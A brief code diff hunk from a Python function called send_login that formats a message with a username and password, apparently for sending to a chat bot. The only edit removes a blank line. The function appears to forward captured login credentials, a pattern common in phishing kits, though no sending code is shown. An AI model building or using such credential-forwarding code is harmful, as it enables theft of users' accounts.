@@ -30,7 +30,6 @@ def send_login():
         # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ
         message = f"""
 <b>👤</b> <b><code>{username}</code></b>
-
 <b>🔑</b> <b><code>{password}</code></b>
 """
         
